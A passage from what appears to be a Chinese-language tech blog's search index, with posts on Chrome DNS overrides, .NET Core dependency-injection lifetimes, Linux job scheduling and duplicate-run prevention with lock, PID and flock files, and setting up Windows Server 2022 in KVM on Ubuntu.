","date":"2023-01-08","objectID":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/:2:1","tags":["chrome","dns","resolve"],"title":"Chrome 反向導向 DNS 網址","uri":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/"},{"categories":["網路"],"content":"另類方法 Switch firefox to use a different DNS than what is in the windows.host file - Stack Overflow 剛剛看 Firefox 設定可以設定 DNS Over Https ，在想可以設定相關 Server，自己瀏覽器設定相關設定，也不會影響所以有電腦，不過感覺還是有點麻煩，所以就先不研究。 ","date":"2023-01-08","objectID":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/:3:0","tags":["chrome","dns","resolve"],"title":"Chrome 反向導向 DNS 網址","uri":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/"},{"categories":["網路"],"content":"Fiddler 需要安裝Fiddler | Web Debugging Proxy and Troubleshooting Solutions，但是這也是很麻煩一件事。 ","date":"2023-01-08","objectID":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/:4:0","tags":["chrome","dns","resolve"],"title":"Chrome 反向導向 DNS 網址","uri":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/"},{"categories":["網路"],"content":"彩蛋 [問題] 是否可以為每個瀏覽器實例定義主機解析規則？ · 第 2767 期 · 微軟/劇作家 Using AdGuard DNS over HTTPS (DoH) on Windows 11 ","date":"2023-01-08","objectID":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/:5:0","tags":["chrome","dns","resolve"],"title":"Chrome 反向導向 DNS 網址","uri":"/blog/posts/Chrome-%E5%8F%8D%E5%90%91%E5%B0%8E%E5%90%91-DNS-%E7%B6%B2%E5%9D%80/"},{"categories":[".Net Core"],"content":"我認為依賴注入是一個很重要觀念，現在每個程式語言都會有這個東西。這個東西學會不管接觸什麼程式語言都是一樣的東西，建議還是學會，學完觀念在配置上 DI 會非常方便。 ","date":"2023-01-08","objectID":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/:0:0","tags":[".netcore","singleton","scoped","transient","di"],"title":"NET Core 依賴注入 AddSingleton AddScoped AddTransient 方法與差異","uri":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/"},{"categories":[".Net Core"],"content":"簡單例子介紹三種差異 下圖參考: Understanding AddTransient Vs AddScoped Vs AddSingleton In ASP.NET Core 這邊我們可到上面圖片有兩個 Request ，這邊經過兩個 Class 實例 (Instance)，建構子會注入相關物件，我們可以觀察上面 ID 知道物件生命週期。這邊箭頭顏色表示該物件生命週期。 Transient 每經過物件注入，這邊可以看到他的生命週期在每個物件實例 (Instance) 都會重新 new 物件。通常會用在資料表 Repository(這邊不是資料庫連線)。 Scoped 每一次 Request 都會建立實例，經過每個 Class 會繼續沿用，直到 Request 結束會釋放記憶體。通常會用在資料庫連線。 Singleton 程式起來就會實例，任何物件做注入會繼續沿用之前建立物件。 ","date":"2023-01-08","objectID":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/:1:0","tags":[".netcore","singleton","scoped","transient","di"],"title":"NET Core 依賴注入 AddSingleton AddScoped AddTransient 方法與差異","uri":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/"},{"categories":[".Net Core"],"content":"我的 CheatSheet AddSingleton 程式建立就換建立物件，生命週期直到程式結束。 AddScoped : HTTP Request 生命週期。 AddTransient: 每個範圍注入都會建立實例。 ","date":"2023-01-08","objectID":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/:2:0","tags":[".netcore","singleton","scoped","transient","di"],"title":"NET Core 依賴注入 AddSingleton AddScoped AddTransient 方法與差異","uri":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/"},{"categories":[".Net Core"],"content":"一般類別註冊 一般使用就能在容器注冊一個物件。 services.AddSingleton\u003cTestService\u003e(); 但通常我們都是一個 Interface 對一個 Class。 services.AddSingleton\u003cITestService, TestService\u003e(); ","date":"2023-01-08","objectID":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/:3:0","tags":[".netcore","singleton","scoped","transient","di"],"title":"NET Core 依賴注入 AddSingleton AddScoped AddTransient 方法與差異","uri":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/"},{"categories":[".Net Core"],"content":"Singleton 自建物件方法 在學 Spring Boot 在有一個 注入 Config.java 會設定相關 DI 物件，Spring Boot 都是自己 new Class去做注冊。但上面我們沒有 new 出來，但是 Net Core 一樣也能做到，這個優點就是能對 物件設定屬性。 var service = new TestService(){ test = \"test\" }; builder.Services.AddSingleton\u003cITestService\u003e(service); public interface ITestService { string Test(); } public class TestService : ITestService { public string TestString { get; set; } public string Test() { return $\"string{TestString}\"; } } ","date":"2023-01-08","objectID":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/:4:0","tags":[".netcore","singleton","scoped","transient","di"],"title":"NET Core 依賴注入 AddSingleton AddScoped AddTransient 方法與差異","uri":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/"},{"categories":[".Net Core"],"content":"泛型注入 services.AddTransient(typeof(IRepository\u003c,\u003e), typeof(RepositoryBase\u003c,\u003e)); 一個 IRepository 可以RepositoryBase這樣做泛型注入。但這樣實作上可以達到自動注入，但實務上寫 Service 也不會這樣做。通常interface和 class 去做，內建沒有自動注入，但透過第三方套件可以做到這件事。 Info 你可能會很好奇typeof(IRepository\u003c,\u003e)怎可以這樣使用，其實這是 C# 映射泛型類別可以做的事情。詳細可以看 如何：使用反映檢視和執行個體化泛型類型 - .NET Framework | Microsoft Learn ","date":"2023-01-08","objectID":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/:5:0","tags":[".netcore","singleton","scoped","transient","di"],"title":"NET Core 依賴注入 AddSingleton AddScoped AddTransient 方法與差異","uri":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/"},{"categories":[".Net Core"],"content":"正確注入方式 public class MyClass { private readonly IOptionsMonitor\u003cMyOptions\u003e _optionsMonitor; public MyClass(IOptionsMonitor\u003cMyOptions\u003e optionsMonitor) { _optionsMonitor = optionsMonitor; } public void MyMethod() { var option = _optionsMonitor.CurrentValue.Option; ... } } 不建議用GetService()。 另一個要避免的服務定位器變化是插入在執行階段解析相依性的處理站。 這兩種做法都會混用控制反轉策略。 避免以靜態方式存取 HttpContext (例如 IHttpContextAccessor.HttpContext)。 DI 是靜態/全域物件存取模式的「替代」選項。 如果您將 DI 與靜態物件存取混合，則可能無法實現 DI 的優點。 ","date":"2023-01-08","objectID":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/:6:0","tags":[".netcore","singleton","scoped","transient","di"],"title":"NET Core 依賴注入 AddSingleton AddScoped AddTransient 方法與差異","uri":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/"},{"categories":[".Net Core"],"content":"設定一個 Interface 指定不同 Class 情況 之前寫 Spring Boot，定義一個 interface 指定到 class 只能有一個，不然 Sprinig Boot 不知道要用哪一個，程式啟動就會抱錯。.Net Core我目前沒看到文章在討論這個，不過我簡單做個實驗，發現會後蓋前。 Spring Boot 啟動 DI 衝突需要解決處理。 .Net Core 會後續執行順序去做 .NET Core 中的相依性插入 | Microsoft Docs 自動載入也是後面吃到哪個 class 為主。但這邊可以用List注入去做多個Service載入。有空在筆記。 這邊會吃到到 TestService(不是2)的class。 這邊還要注意，假如你用Interface對應Class去註冊的話，在Controller或其他地方取出來的時候，使用Class參數引進的話，不會抓到任何東西，會跑出InvalidOperationException，這邊跟 Spring Boot不太一樣。Laravel是不是也這樣，我就不太清楚。(那時候我還不熟DI，只是覺得很神奇) ","date":"2023-01-08","objectID":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/:7:0","tags":[".netcore","singleton","scoped","transient","di"],"title":"NET Core 依賴注入 AddSingleton AddScoped AddTransient 方法與差異","uri":"/blog/posts/NET-Core-%E4%BE%9D%E8%B3%B4%E6%B3%A8%E5%85%A5-AddSingleton-AddScoped-AddTransient-%E6%96%B9%E6%B3%95%E8%88%87%E5%B7%AE%E7%95%B0/"},{"categories":["Linux"],"content":"之前我有寫過幾篇排程啟動文章，最近要去接觸 Windows 環境，工作上可能就不會碰到，這邊做一下簡單整理。怕哪天回來忘了 ","date":"2022-12-30","objectID":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/:0:0","tags":["linux","crontab","cron","flock"],"title":"整理 Linux 排程方法","uri":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Crontab Crontab排程設定 - 程式狂想筆記 - 記錄著我接觸程式藝文 排程 crontab 時間設定月底執行方法 - 程式狂想筆記 - 記錄著我接觸程式藝文 設定crontab排程時區小記 - 程式狂想筆記 - 記錄著我接觸程式藝文 Crontab 執行特定目錄 - 程式狂想筆記 - 記錄著我接觸程式藝文 ","date":"2022-12-30","objectID":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/:1:0","tags":["linux","crontab","cron","flock"],"title":"整理 Linux 排程方法","uri":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"防止重複執行 flock 防止重新執行方法 - 程式狂想筆記 - 記錄著我接觸程式藝文 這個算是萬用搭配，這個我用很多次沒遇到什麼問題。我之前有一間公司會這樣用，雖然 Crontab 指令會特別長，但還算滿好用。理論上所有防止重複執行都能做到，可以看我這篇。 ","date":"2022-12-30","objectID":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/:1:1","tags":["linux","crontab","cron","flock"],"title":"整理 Linux 排程方法","uri":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Systemd 我覺得這個是一個非常強悍工具，但我目前待過公司都沒有使用這個，只有外商面試有問到這個東西。因為程式是pid(1)再跑，所以穩定性是沒話說。有興趣可以爬文整理，我覺得使用門檻很高。 Systemd 時間排程筆記 - 程式狂想筆記 - 記錄著我接觸程式藝文 rclone 掛載硬碟小記 - 程式狂想筆記 - 記錄著我接觸程式藝文 ","date":"2022-12-30","objectID":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/:2:0","tags":["linux","crontab","cron","flock"],"title":"整理 Linux 排程方法","uri":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"at 一次性排程 之前AT 排程設定有寫過筆記，理論上平時不會用到，但是有時候特殊狀態之下就會用了。 ","date":"2022-12-30","objectID":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/:3:0","tags":["linux","crontab","cron","flock"],"title":"整理 Linux 排程方法","uri":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"虛擬容器排程 crazy-max/swarm-cronjob: Create jobs on a time-based schedule on Docker Swarm 之前這個文章就有簡單提過。 CronJob | Kubernetes 之前這篇文章也有玩到。 ","date":"2022-12-30","objectID":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/:4:0","tags":["linux","crontab","cron","flock"],"title":"整理 Linux 排程方法","uri":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"彩蛋 ","date":"2022-12-30","objectID":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/:5:0","tags":["linux","crontab","cron","flock"],"title":"整理 Linux 排程方法","uri":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Supervisor Systemd 通常會跟 Supervisor 比較。這兩個是 daemon ，中文叫守護進程或常駐程式。Systemd 有時間執行方法，但是 Supervisor 沒有，網路上很多都是搭配 Crontab 呼叫。之前我這篇有提到Systemd 時間排程筆記 - 程式狂想筆記 - 記錄著我接觸程式藝文這個。 用 Supervisor 管理系統程式 - 小惡魔 - AppleBOY 伸縮自如的Flask [day 27] Supervisor - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2022-12-30","objectID":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/:5:1","tags":["linux","crontab","cron","flock"],"title":"整理 Linux 排程方法","uri":"/blog/posts/%E6%95%B4%E7%90%86-Linux-%E6%8E%92%E7%A8%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最進工作在 Windows 伺服器，有些 Linux 東西想在 Windows 實現，但這邊做個 Linux 回顧整理，以後想要用的話可以回來看個筆記。 ","date":"2022-12-29","objectID":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:0:0","tags":["linux","cron","crontab","flock","solo","lock"],"title":"Linux 防止程式同時執行方法","uri":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"實作方法 以下參照Linux 防止 Shell 指令稿重複執行教學 - G. T. Wang實作，有些我之前有用過，但有幾個沒看過方法，我覺得還滿有趣的，這邊就簡單操作。 Preventing duplicate cron job executions - Benjamin Cane ","date":"2022-12-29","objectID":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:1:0","tags":["linux","cron","crontab","flock","solo","lock"],"title":"Linux 防止程式同時執行方法","uri":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"鎖定檔案（lock file） 這邊注意，鎖定檔案不是指檔案被鎖定(lock)，怎麼感覺有點繞口令😅，這邊建立檔案但檔案還是可以被刪除。這邊假如你 Script 當掉強制關掉或直接重開機，這邊檔案可能還會存在，存在的話程式就無法打開，可能要注意這個問題。這個方法我之前有一個專案也有類似用這個方法，但這個方法缺點如剛剛所說，所以我每次程式執行錯誤都要刪除 lock file 才能執行。 #!/bin/sh # 鎖定檔案路徑 LOCK_FILE=/home/gtwang/my_script.lock # 檢查鎖定檔案 if [ -f $LOCK_FILE ]; then echo \"This script is already running!\" exit 1 fi # 建立 lock file touch $LOCK_FILE # 檢查鎖定檔案是否成功被建立 if [ ! -f $LOCK_FILE ]; then echo \"Cannot create lock file!\" exit 1 fi # 主要工作 echo \"Doing my job.\" sleep 30 echo \"Done.\" # 刪除鎖定檔案 rm -f ${LOCK_FILE} 實作真的很簡單，執行程式。Ctrl+C 就會中斷程式但你就會發現你程式不能執行了。刪掉就能解決。 ","date":"2022-12-29","objectID":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:1:1","tags":["linux","cron","crontab","flock","solo","lock"],"title":"Linux 防止程式同時執行方法","uri":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"行程 ID 檔案（PID file） 推薦!!! 大多數 Linux 很多都用這種方式，當然有些 pid 是用上面方式去實作，沒有檢查 pid 程式是否有真的執行，我很推薦用這個方法。 #!/bin/sh # 行程 ID 檔案路徑 PID_FILE=/home/gtwang/my_script.pid # 檢查行程 ID 檔案是否存在 if [ -f $PID_FILE ]; then # 取得行程 ID PID=$(cat $PID_FILE) # 檢查行程是否有在執行 ps -p $PID \u003e /dev/null 2\u003e\u00261 if [ $? -eq 0 ]; then echo \"This script is already running!\" exit 1 fi fi # 行程沒有在執行，將目前行程 ID 寫入檔案 echo $$ \u003e $PID_FILE # 檢查行程 ID 檔案是否成功被建立 if [ $? -ne 0 ]; then echo \"Could not create PID file.\" exit 1 fi # 主要工作 echo \"Doing my job.\" sleep 30 echo \"Done.\" # 刪除鎖定檔案 rm -f ${PID_FILE} Pid 檔案也沒被鎖住，這邊不能手動刪掉，就算程式中斷不會像上一個方法(flock)卡住。 ","date":"2022-12-29","objectID":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:1:2","tags":["linux","cron","crontab","flock","solo","lock"],"title":"Linux 防止程式同時執行方法","uri":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"flock 多年前有寫過這篇flock 防止重新執行方法 - 程式狂想筆記 - 記錄著我接觸程式藝文，我之前公司有用過，寫在Crontab 不須寫 Script 就能控制防止同時執行。 這邊我還是推薦使用 Pid 檔案檢查方式，原因是 flock 是真的鎖住檔案，理論上應該會佔掉一個 CPU 工作序。我使用覺得還滿穩的，僅次推薦。 # 以 /home/gtwang/my_script.lock 為鎖定檔案， # 讓 /home/gtwang/my_script.sh 同一時間只執行一次 flock -x /home/gtwang/my_script.lock -c /home/gtwang/my_script.sh # 若發現重複執行，則直接離開 flock -nx /home/gtwang/my_script.lock -c /home/gtwang/my_script.sh ","date":"2022-12-29","objectID":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:1:3","tags":["linux","cron","crontab","flock","solo","lock"],"title":"Linux 防止程式同時執行方法","uri":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"solo 這個方法我覺得很有趣，但使用可能會佔住 127.0.0.1 的 Port，理論上不影響對外 Port，但假如你的服務針對所以對外 Port 還是會有衝突可能，你這樣玩可能 SE 工程師在你背後很火，所以不是很推薦這樣用，但這招我覺得滿實用。 ","date":"2022-12-29","objectID":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:1:4","tags":["linux","cron","crontab","flock","solo","lock"],"title":"Linux 防止程式同時執行方法","uri":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"程式檔名檢查大法 用檔名去 ps去做檢查，但這樣程式不能取相同名子，不然會撞到不能執行，理論上可能會存在漏洞，但率比較低，我有遇過有公司這樣做檢查。這邊要注意，不同程式相同名稱就會有問題，這邊就不實作了。 可參考: 【shell】防止脚本重复运行_q3dxdx的博客-CSDN博客 ","date":"2022-12-29","objectID":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:2:0","tags":["linux","cron","crontab","flock","solo","lock"],"title":"Linux 防止程式同時執行方法","uri":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"彩蛋 防止程式同時執行多份，比檢查Process清單更好的方法-黑暗執行緒 C#如何防止程式多次執行的技巧 - IT閱讀 Powershell 學習筆記-黑暗執行緒 .NET 中使用 Mutex 进行跨越进程边界的同步 - walterlv - 博客园 让powershell同时只能运行一个脚本（进程互斥例子） - PowerShell免费软件 - 博客园 ","date":"2022-12-29","objectID":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:3:0","tags":["linux","cron","crontab","flock","solo","lock"],"title":"Linux 防止程式同時執行方法","uri":"/blog/posts/Linux-%E9%98%B2%E6%AD%A2%E7%A8%8B%E5%BC%8F%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["linux"],"content":"最近一台舊筆電閒置，因為最近跳去寫 Net Core，公司伺服器所有環境幾乎都是 Windows，因為我也不太熟，想測試 Windows Server 環境，最近找一些方案執行，順便紀錄。可以透過 VNC 遠端操作 VM。 ","date":"2022-12-28","objectID":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/:0:0","tags":["ubuntu","linux","windows"],"title":"在 Ubuntu KVM 安裝 Window Server 2022","uri":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/"},{"categories":["linux"],"content":"Ubuntu VNC 配置 這邊有特別紀錄。我不是用一般網路上找到的方式，這邊是用原生方法，成功機率很高，但缺點要開著螢幕。 VNC server配置 - 珂珂keo - 博客园 ","date":"2022-12-28","objectID":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/:1:0","tags":["ubuntu","linux","windows"],"title":"在 Ubuntu KVM 安裝 Window Server 2022","uri":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/"},{"categories":["linux"],"content":"KVM 安裝與事前準備 以下教學都參考(28) Install Windows Server 2022 in a nested KVM environment on Ubuntu 20.04 with standard NAT. - YouTube教學整理過程 You can download the Windows Server 2022 from the official Microsoft Evaluation Download site. You need to enter you information do download the eval. https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022 You can download the virtual IO drivers from here. https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win.iso ISO 載點可以去官方找Windows Server 2022 | Microsoft 評估中心 sudo apt -y install bridge-utils cpu-checker libvirt-clients libvirt-daemon qemu qemu-kvm virt-manager 檢查 sudo kvm-ok 設定權限，不然使用工具可能打不開，以下指令打完請重開機(理論上登出再登入就可以了)。 sudo adduser \u003cusername\u003e kvm sudo adduser \u003cusername\u003e libvirt 打不開其況如下 ","date":"2022-12-28","objectID":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/:2:0","tags":["ubuntu","linux","windows"],"title":"在 Ubuntu KVM 安裝 Window Server 2022","uri":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/"},{"categories":["linux"],"content":"安裝 Window Server 2022 virt-manager 開啟 KVM 管理工具。 下面圖片挑一個方法載入 ISO。 選上對應版本號。 不動這邊設定。 這邊其實也可以不用設定，但我看其他教學可以自訂一個磁區，空間也會比較省。 選擇操作如下，最後按下 Choose Volume。 繼續下一步。 雖然我們不跑 VirtIO 設定，但我們是用 VNC 遠端 Ubuntu，這邊你使用 VNC 操作 VM 鍵盤不會有動作，所以這邊要特別設定調整。 視窗調整。 等一陣子，打上密碼。 有遇到這個不用怕，給他按下去就沒錯。 ","date":"2022-12-28","objectID":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/:3:0","tags":["ubuntu","linux","windows"],"title":"在 Ubuntu KVM 安裝 Window Server 2022","uri":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/"},{"categories":["linux"],"content":"KVM 使用技巧 在使用全螢幕的時候發現無法跳離 VM，這邊問到 AI Ctrl+Alt 可以跳離 VM。 ","date":"2022-12-28","objectID":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/:4:0","tags":["ubuntu","linux","windows"],"title":"在 Ubuntu KVM 安裝 Window Server 2022","uri":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/"},{"categories":["linux"],"content":"小記 Command # 顯示所有機器 virsh list --all # 啟動 VM virsh start xxx # snapshot ## 建立 snapshot virsh snapshot-create win2k22 # 顯示 snapshot virsh snapshot-list win2k22 # 建立 snapshot 可注記 virsh snapshot-create-as win2k22 --name \"win2k22_snapshot_1\" --description \"First named snapshot\" --atomic # 顯示 snapshot 關係 virsh snapshot-list rhel7.3 --parent virsh snapshot-list rhel7.3 --tree 更多 snapshot 操作可以看[Linux KVM] Template \u0026 Snapshot 的運用 | 小信豬的原始部落 ","date":"2022-12-28","objectID":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/:5:0","tags":["ubuntu","linux","windows"],"title":"在 Ubuntu KVM 安裝 Window Server 2022","uri":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/"},{"categories":["linux"],"content":"Multipass 驅動在 libvirt snap install multipass # 我是發現已經安裝 sudo apt install libvirt-daemon-system # connect the libvirt interface/plug $ sudo snap connect multipass:libvirt # you'll need to stop all the instances first $ multipass stop --all # and tell Multipass to use libvirt $ multipass set local.driver=libvirt 詳細可以看How to set up the driver | Multipass documentation ","date":"2022-12-28","objectID":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/:6:0","tags":["ubuntu","linux","windows"],"title":"在 Ubuntu KVM 安裝 Window Server 2022","uri":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/"},{"categories":["linux"],"content":"其他 [Linux KVM] Template \u0026 Snapshot 的運用 | 小信豬的原始部落 ubuntu 18.04 desktop不接显示器开启 vnc 服务 CentOS创建KVM虚拟机 - TinyChen’s Studio - 互联网技术学习工作经验分享 推薦可以看上面教學文章，裡面有很清楚介紹一些設定。備份圖 